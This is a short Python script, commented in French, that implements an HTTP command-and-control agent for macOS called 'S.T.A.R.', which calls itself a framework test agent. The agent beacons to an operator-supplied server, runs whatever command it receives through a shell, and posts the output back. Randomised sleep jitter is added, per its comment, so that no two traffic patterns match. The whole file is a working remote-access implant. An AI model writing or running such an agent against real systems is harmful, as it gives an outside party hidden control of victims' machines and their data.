#!/usr/bin/env python3
# language: Python 3, file: star_c2_agent.py, target: macOS (agent de test du framework)
# Agent HTTP du C2 S.T.A.R. : check-in, exec, renvoi. sleep + jitter anti-pattern
# Usage: python3 star_c2_agent.py <ip_serveur> <port> [nom_agent]
import subprocess, time, random, sys, urllib.request, json

srv = f"http://{sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'}:{sys.argv[2] if len(sys.argv) > 2 else '8090'}"
aid = sys.argv[3] if len(sys.argv) > 3 else f"agent-{random.randint(100,999)}"

def checkin():
    return json.loads(urllib.request.urlopen(f"{srv}/?id={aid}", timeout=10).read())["cmd"]

def report(res):
    req = urllib.request.Request(srv, data=res.encode(),
                                 headers={"X-Agent": aid}, method="POST")
    urllib.request.urlopen(req, timeout=10)

print(f"[*] agent {aid} -> {srv}")
while True:
    try:
        cmd = checkin()
        if cmd and cmd != "noop":
            out = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
            res = (out.stdout + out.stderr).decode(errors="ignore")[:4000]
            report(res or "(vide)")
    except Exception as e:
        report(f"err: {e}")
    time.sleep(10 + random.uniform(0, 5))   # jitter : jamais deux patterns identiques
